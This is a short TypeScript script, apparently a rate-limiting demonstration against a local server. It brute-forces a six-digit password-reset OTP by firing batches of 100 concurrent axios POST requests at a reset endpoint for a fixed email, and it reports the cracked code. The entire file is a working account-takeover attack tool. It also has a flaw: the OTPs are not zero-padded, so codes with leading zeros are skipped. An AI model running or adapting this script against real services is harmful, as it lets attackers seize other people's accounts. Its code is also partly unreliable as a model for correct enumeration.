import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    "email": "dhruv@gmail.com",
    "otp": otp,
    "newPassword": "sdsdsd"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    const res = await axios.request(config);
    console.log("✅ SUCCESS for OTP:", otp, res.data);
    return { success: true, otp, data: res.data };
  } catch (e) {
    return { success: false, otp };
  }
}

async function main() {
  for (let i = 0; i <= 999999; i += 100) {

    const promises: Promise<{ success: boolean; otp: string; data?: any }>[] = [];

    for (let j = 0; j < 100; j++) {
      const otp = String(`${i + j}`);
      console.log(i+j)
      promises.push(sendRequest(otp));
    }

    const results = await Promise.all(promises);

    for (const result of results) {
      if (result.success) {
        console.log("🔥 OTP CRACKED:", result.otp);
        console.log("Response:", result.data);
        return; 
      }
    }
  }
}

main();
